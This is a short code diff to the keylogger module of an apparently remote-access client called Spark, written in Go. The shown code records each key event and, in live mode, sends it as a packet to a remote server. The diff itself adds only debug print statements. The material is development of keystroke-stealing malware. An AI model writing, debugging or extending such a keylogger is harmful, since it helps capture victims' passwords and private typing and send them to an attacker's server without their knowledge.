@@ -3,6 +3,7 @@ package keylogger
 import (
 	"Spark/client/common"
 	"Spark/modules"
+	"fmt"
 	"sync"
 	"time"
 
@@ -91,8 +92,12 @@ func (k *Keylogger) AddEvent(event KeyEvent) {
 
 	k.events = append(k.events, event)
 
+	// Debug logging
+	fmt.Printf("Event added: %s (mode: %s, total events: %d)\n", event.Key, k.config.Mode, len(k.events))
+
 	// Send live if in live mode
 	if k.config.Mode == "live" || k.config.Mode == "both" {
+		fmt.Printf("Sending live event: %s\n", event.Key)
 		k.sendLiveEvent(event)
 	}
 
@@ -114,6 +119,7 @@ func (k *Keylogger) sendLiveEvent(event KeyEvent) {
 		},
 	}
 
+	fmt.Printf("Sending packet to server: %+v\n", packet.Data)
 	k.conn.SendPack(packet)
 }
 
